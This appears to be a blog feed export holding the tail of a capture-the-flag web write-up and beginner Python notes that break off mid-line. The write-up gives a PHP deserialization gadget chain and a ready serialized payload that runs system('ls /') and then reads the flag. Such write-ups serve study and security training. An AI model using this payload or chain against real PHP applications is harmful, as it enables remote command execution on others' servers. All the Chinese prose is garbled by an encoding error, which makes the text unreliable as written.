class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> D();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;a-&gt;read();</span></span><br><span class="line">        <span class="comment">// return &quot;lock lock read!&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> F();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$b = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;learn();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$a = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;see();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// die($this-&gt;a);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> E(<span class="string">&#x27;&#x27;</span>,<span class="keyword">new</span> A());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $s1 = $this-&gt;b;</span></span><br><span class="line">        <span class="comment">// $s1();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>[<span class="number">1</span>] = <span class="keyword">new</span> E(<span class="keyword">new</span> C(),<span class="string">&#x27;&#x27;</span>);;</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å°†ç»“æœå’Œpayload1åˆåœ¨ä¸€èµ·ï¼š<br>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†åˆ©ç”¨readflagè¯»å–å°±å¥½äº†</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>n^3ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…å­¦äº¿ä¸‹python</title>
    <url>/2022/02/13/%E6%B5%85%E5%AD%A6%E4%BA%BF%E4%B8%8Bpython/</url>
    <content><![CDATA[<h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><h3 id="1-python"><a href="#1-python" class="headerlink" title="1. python"></a>1. python</h3><p>1.cmdï¼ˆå‘½ä»¤æç¤ºç¬¦ï¼‰ä¸­è¾“å…¥pythonï¼Œè¿›è¡Œç¨‹åºç¼–å†™</p>
<p>2.å£°æ˜ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œç„¶ååœ¨è¯¥ç›®å½•ä¸‹<code>python xx.py</code>æ‰§è¡Œpythonæ–‡ä»¶</p>
<p>3.pycharmç¼–è¯‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="0x01-pycharmä»¥åŠæ³¨é‡Š"><a href="#0x01-pycharmä»¥åŠæ³¨é‡Š" class="headerlink" title="0x01: pycharmä»¥åŠæ³¨é‡Š"></a>0x01: pycharmä»¥åŠæ³¨é‡Š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="0x02-æ•°æ®ç±»å‹"><a href="#0x02-æ•°æ®ç±»å‹" class="headerlink" title="0x02: æ•°æ®ç±»å‹"></a>0x02: æ•°æ®ç±»å‹</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥è¯¢å˜é‡æ•°æ®ç±»å‹</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°å­—ï¼ˆintã€floatã€complexã€boolï¼‰</span><br><span class="line"></span><br><span class="line">å­—ç¬¦ä¸²ï¼ˆstrï¼‰</span><br><span class="line"></span><br><span class="line">å­—å…¸ï¼ˆdictï¼‰</span><br><span class="line">a = &#123;&#125;</span><br><span class="line"></span><br><span class="line">å…ƒç»„ï¼ˆTupleï¼‰</span><br><span class="line">b = ()</span><br><span class="line"></span><br><span class="line">åˆ—è¡¨ï¼ˆlistï¼‰</span><br><span class="line">c = []</span><br></pre></td></tr></table></figure>

<p>å˜é‡å‘½åè§„åˆ™å’Œcå·®ä¸å¤š</p>
<p>å‘½åè§„èŒƒ</p>
<h5 id="0x03-pythonåŸºæœ¬è¿ç®—ç¬¦"><a href="#0x03-pythonåŸºæœ¬è¿ç®—ç¬¦" class="headerlink" title="0x03:pythonåŸºæœ¬è¿ç®—ç¬¦"></a>0x03:pythonåŸºæœ¬è¿ç®—ç¬¦</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç®—æœ¯è¿ç®—ç¬¦ï¼š</span><br><span class="line">+ - * / % ** </span><br><span class="line">åœ°æ¿é™¤ï¼š//</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¯”è¾ƒè¿ç®—ç¬¦ï¼š</span><br><span class="line">== &lt; &gt; &lt;= &gt;= !=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#é€»è¾‘è¿ç®—ç¬¦ï¼š</span><br><span class="line">#and or not</span><br><span class="line">and æ¡ä»¶å¿…é¡»éƒ½ä¸ºtrueè¿”å›true</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¼˜å…ˆçº§ï¼š</span><br><span class="line">()-&gt;not-&gt;and-&gt;or</span><br></pre></td></tr></table></figure>

<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h5><h5 id="è¾“å…¥ä¸è¾“å‡º"><a href="#è¾“å…¥ä¸è¾“å‡º" class="headerlink" title="è¾“å…¥ä¸è¾“å‡º"></a>è¾“å…¥ä¸è¾“å‡º</h5><p>è¾“å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = &#x27;å¼ ä¸‰&#x27;</span><br><span class="line">sex = &#x27;male&#x27;</span><br><span class="line">print(&#x27;æˆ‘çš„åå­—æ˜¯%sï¼Œæ˜¯%s&#x27;%(name,sex))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¼å¼åŒ–è¾“å‡ºï¼›</span><br><span class="line">ä½¿ç”¨ format</span><br><span class="line">name = &#x27;yuer&#x27;</span><br><span class="line">print(&#x27;name:&#123;&#125;&#x27;.format(name))</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = input(&#x27;pleast input your name:&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="2-åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶"><a href="#2-åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶" class="headerlink" title="2.åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶"></a>2.åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶</h3><h5 id="0x01-if-elseè¯­å¥"><a href="#0x01-if-elseè¯­å¥" class="headerlink" title="0x01:if-elseè¯­å¥"></a>0x01:if-elseè¯­å¥</h5><p>æµç¨‹ï¼šè®¡ç®—æœºæ‰§è¡Œä»£ç çš„é¡ºåº</p>
<p>æµç¨‹æ§åˆ¶ï¼šå¯¹è®¡ç®—æœºæ‰§è¡Œä»£ç é¡ºåºçš„ç®¡ç†ï¼Œåªæœ‰æµç¨‹æ§åˆ¶æ‰èƒ½å®ç°åœ¨å¼€å‘å½“ä¸­çš„ä¸šåŠ¡é€»è¾‘</p>
<p>æµç¨‹æ§åˆ¶åˆ†ç±»ï¼šé¡ºåºæµç¨‹ã€é€‰æ‹©ï¼ˆåˆ†æ”¯ï¼‰æµç¨‹ã€å¾ªç¯æµç¨‹</p>
<p>é€‰æ‹©æµç¨‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŒåˆ†æ”¯ï¼š</span><br><span class="line">if æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">else:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line"></span><br><span class="line">å¤šåˆ†æ”¯ï¼š</span><br><span class="line">if æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">elif æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">else:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>æ¡ä»¶è¡¨è¾¾å¼ï¼šæ¯”è¾ƒè¿ç®—ç¬¦/é€»è¾‘è¿ç®—ç¬¦/å¤åˆè¿ç®—ç¬¦</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = int(input(&quot;è¯·è¾“å…¥æ•°å­—ï¼š&quot;))</span><br><span class="line">if a &gt;= 1:</span><br><span class="line">	print(&quot;true&quot;)</span><br><span class="line">elif a == 0:</span><br><span class="line">	print(&quot;false&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;a little true&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="0x02-whileå¾ªç¯"><a href="#0x02-whileå¾ªç¯" class="headerlink" title="0x02:whileå¾ªç¯"></a><strong>0x02:whileå¾ªç¯</strong></h5><p>å¾ªç¯æµç¨‹Â·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">	é€»è¾‘ä»£ç </span><br><span class="line">	</span><br><span class="line">for ... in å¯è¿­ä»£é›†åˆå¯¹è±¡:</span><br><span class="line">	é€»è¾‘ä»£ç </span><br></pre></td></tr></table></figure>

<p><strong>whileè¯­æ³•ç‰¹ç‚¹ï¼š</strong></p>
<p>1.å¾ªç¯å¿…é¡»æœ‰ä¸€ä¸ªåˆå§‹å€¼</p>
<p>2.å¿…é¡»æœ‰æ¡ä»¶è¡¨è¾¾å¼</p>
<p>3.è¦æœ‰è‡ªå¢æˆ–è‡ªå‡å˜é‡ï¼Œå¦åˆ™ä¼šæ­»å¾ªç¯</p>
<p>4.å¾ªç¯æ¬¡æ•°ä¸ç¡®å®šï¼Œä¾é å¾ªç¯æ¡ä»¶ç»“æŸ</p>
<p>5.ä¸»è¦ç”¨äºåˆ¤æ–­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while true:</span><br><span class="line">	pythonä»£ç æ®µ</span><br></pre></td></tr></table></figure>

<h5 id="0x03-forå¾ªç¯"><a href="#0x03-forå¾ªç¯" class="headerlink" title="0x03:forå¾ªç¯"></a><strong>0x03:forå¾ªç¯</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">for ä¸´æ—¶å˜é‡ in å­—ç¬¦ä¸²ã€åˆ—è¡¨ç­‰:</span><br><span class="line">	æ‰§è¡Œä»£ç </span><br><span class="line">	â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>è¯­æ³•ç‰¹ç‚¹ï¼š</p>
<p>1.éå†æ“ä½œï¼Œä¾æ¬¡åœ°å–é›†åˆå®¹å™¨ä¸­çš„æ¯ä¸ªå€¼</p>
<p>é€‚ç”¨äºå·²çŸ¥çš„å¾ªç¯æ¬¡æ•°ï¼ˆå¯è¿­ä»£å¯¹è±¡çš„éå†</p>
<p>egï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tags=<span class="string">&#x27;abcdefg&#x27;</span>  <span class="comment">#å­—ç¬¦ä¸²ç±»å‹æœ¬èº«å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ç±»å‹çš„é›†åˆ</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> tags:</span><br><span class="line">	<span class="built_in">print</span>(item)</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>rangeå‡½æ•°</code> æ­¤å‡½æ•°å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ•°æ®é›†åˆåˆ—è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rangeå‡½æ•°ä½¿ç”¨ï¼š</span><br><span class="line">range(èµ·å§‹å€¼:ç»“æŸ:æ­¥é•¿) æ­¥é•¿ä¸èƒ½ä¸º0</span><br><span class="line">range(1,100,1)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p><u>forâ€”else</u></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k = key</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> i == k:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°key&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">username = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    zh = <span class="built_in">input</span>(<span class="string">&quot;è´¦å·ï¼š&quot;</span>)</span><br><span class="line">    pd = <span class="built_in">input</span>(<span class="string">&quot;å¯†ç ï¼š&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> zh == username <span class="keyword">and</span> pd == password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è´¦å·æˆ–è€…å¯†ç é”™è¯¯ï¼Œè¯·é‡æ–°ç™»å½•&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-breakã€continue"><a href="#0x04-breakã€continue" class="headerlink" title="0x04:breakã€continue"></a><strong>0x04:breakã€continue</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">breaké€€å‡ºå¾ªç¯</span><br><span class="line">continueè·³è¿‡æœ¬æ¬¡å¾ªç¯ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯</span><br></pre></td></tr></table></figure>

<h3 id="3-é«˜çº§æ•°æ®ç±»å‹"><a href="#3-é«˜çº§æ•°æ®ç±»å‹" class="headerlink" title="3.é«˜çº§æ•°æ®ç±»å‹"></a>3.é«˜çº§æ•°æ®ç±»å‹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åºåˆ—ï¼šä¸€ç»„æŒ‰ç…§é¡ºåºæ’åºçš„å€¼ï¼ˆæ•°æ®é›†åˆ</span><br><span class="line">åœ¨pythonä¸­å­˜åœ¨ä¸‰ç§å†…ç½®çš„åºåˆ—ç±»å‹ï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</span><br><span class="line"></span><br><span class="line">ä¼˜ç‚¹ï¼šå¯ä»¥æ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡çš„æ“ä½œ</span><br><span class="line">ç‰¹å¾ï¼šç¬¬ä¸€ä¸ªæ­£ç´¢å¼•ä¸º0ï¼ŒæŒ‡å‘çš„æ˜¯å·¦ç«¯ï¼Œç¬¬ä¸€ä¸ªç´¢å¼•ä¸ºè´Ÿæ•°çš„æ—¶å€™ï¼ŒæŒ‡å‘çš„æ˜¯å³ç«¯</span><br><span class="line"></span><br><span class="line">#åˆ‡ç‰‡æ˜¯æŒ‡æˆªå–å­—ç¬¦ä¸²ä¸­çš„ä»»æ„ä¸€æ®µå†…å®¹ã€‚</span><br><span class="line">#ä½¿ç”¨æ–¹æ³•ï¼š[èµ·å§‹ä¸‹æ ‡:ä»‹ç»ä¸‹æ ‡:æ­¥é•¿]åˆ‡ç‰‡æˆªå–çš„å†…å®¹ä¸åŒ…å«ç»“æŸä¸‹æ ‡å¯¹åº”çš„æ•°æ®ï¼Œæ­¥é•¿æŒ‡çš„æ˜¯éš”å‡ ä¸ªä¸‹æ ‡è·å–ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">ä¸‹æ ‡ä¼šè¶Šç•Œï¼Œåˆ‡ç‰‡ä¸ä¼š</span><br></pre></td></tr></table></figure>

<h5 id="0x01-å­—ç¬¦ä¸²"><a href="#0x01-å­—ç¬¦ä¸²" class="headerlink" title="0x01:å­—ç¬¦ä¸²"></a>0x01:å­—ç¬¦ä¸²</h5><p><strong>å¸¸ç”¨æ–¹æ³•ï¼š</strong></p>
<table>
<thead>
<tr>
<th align="center">capitalize()</th>
<th align="center">é¦–å­—æ¯å˜å¤§å†™</th>
</tr>
</thead>
<tbody><tr>
<td align="center">endswith()/startswith()</td>
<td align="center">æ˜¯å¦-&gt;ç»“æŸ/å¼€å§‹</td>
</tr>
<tr>
<td align="center">id()</td>
<td align="center">æŸ¥çœ‹å˜é‡å†…å­˜åœ°å€</td>
</tr>
<tr>
<td align="center">find()</td>
<td align="center">æ£€æµ‹xæ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­</td>
</tr>
<tr>
<td align="center">index()</td>
<td align="center">æ£€æµ‹xæ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­</td>
</tr>
<tr>
<td align="center">isalnum()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯å­—æ¯å’Œæ•°å­—</td>
</tr>
<tr>
<td align="center">isalpha()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯å­—æ¯</td>
</tr>
<tr>
<td align="center">isdigit()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—</td>
</tr>
<tr>
<td align="center">islower()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯å°å†™</td>
</tr>
<tr>
<td align="center">join()</td>
<td align="center">å¾ªç¯å–å‡ºæ‰€æœ‰å€¼å¾—ç”¨xxå»è¿æ¥</td>
</tr>
<tr>
<td align="center">lower()/upper()</td>
<td align="center">å¤§å°å†™è½¬æ¢</td>
</tr>
<tr>
<td align="center">swapcase()</td>
<td align="center">å¤§å†™å˜å°å†™ï¼Œå°å†™å˜å¤§å†™</td>
</tr>
<tr>
<td align="center">lstrip()/rstrip()/strip()</td>
<td align="center">ç§»é™¤å·¦/å³/ä¸¤ä¾§ç©ºç™½</td>
</tr>
<tr>
<td align="center">split()</td>
<td align="center">åˆ‡å‰²å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">title()</td>
<td align="center">æŠŠæ¯ä¸ªå•è¯çš„é¦–å­—æ¯å˜æˆå¤§å†™</td>
</tr>
<tr>
<td align="center">replace(old,new,count=None)</td>
<td align="center">æ›¿æ¢å­—ç¬¦ï¼Œcountä¸ºæ›¿æ¢ä¸ªæ•°ï¼Œæ— countè¡¨ç¤ºå…¨éƒ¨æ›¿æ¢</td>
</tr>
<tr>
<td align="center">count()</td>
<td align="center">ç»Ÿè®¡å‡ºç°çš„æ¬¡æ•°</td>
</tr>
</tbody></table>
<h6 id="1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨"><a href="#1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨"></a>1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#capitalize()</span></span><br><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name.capitalize()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is %s&quot;</span>%name.capitalize())</span><br><span class="line"></span><br><span class="line"><span class="comment">#strip()</span></span><br><span class="line">a = <span class="string">&#x27;  yuer  &#x27;</span></span><br><span class="line">b = a.strip()</span><br><span class="line">c = a.lstrip()</span><br><span class="line">d = a.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="comment">#id()</span></span><br><span class="line">a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">b = a <span class="comment">#å¯¹å†…å­˜åœ°å€è¿›è¡Œå¤åˆ¶</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="comment">#find()  index()</span></span><br><span class="line"><span class="comment">#findå¦‚æœæ²¡æœ‰æ‰¾åˆ°å°±è¿”å›-1</span></span><br><span class="line"><span class="comment">#findå¦‚æœæ²¡æœ‰æ‰¾åˆ°å°±ä¼šæŠ¥é”™</span></span><br><span class="line">a = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.find(<span class="string">&#x27;o&#x27;</span>))     <span class="comment">#1 ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡ï¼Œä¸‹æ ‡ä»0å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#startswith() endswith()</span></span><br><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.startswith(<span class="string">&#x27;y&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(a.endswith(<span class="string">&#x27;r&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lower()/upper()</span></span><br><span class="line"><span class="comment">#å¯¹å…¨ä½“è¿›è¡Œæ“ä½œ</span></span><br><span class="line">a = <span class="string">&#x27;CooKie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.lower())</span><br><span class="line"><span class="built_in">print</span>(a.upper())</span><br></pre></td></tr></table></figure>

<h6 id="2-åˆ‡ç‰‡æ“ä½œ"><a href="#2-åˆ‡ç‰‡æ“ä½œ" class="headerlink" title="2.åˆ‡ç‰‡æ“ä½œ"></a>2.åˆ‡ç‰‡æ“ä½œ</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;we need a pwner&#x27;</span></span><br><span class="line"><span class="comment"># slice [start:end:step]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>) <span class="comment">#è¾“å‡ºå®Œæ•´æ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>]) <span class="comment">#æŸä¸ªæ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:<span class="number">6</span>])  <span class="comment"># nee ç»“æŸç‚¹ä¸è¢«åŒ…å« å·¦é—­å³å¼€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:])  <span 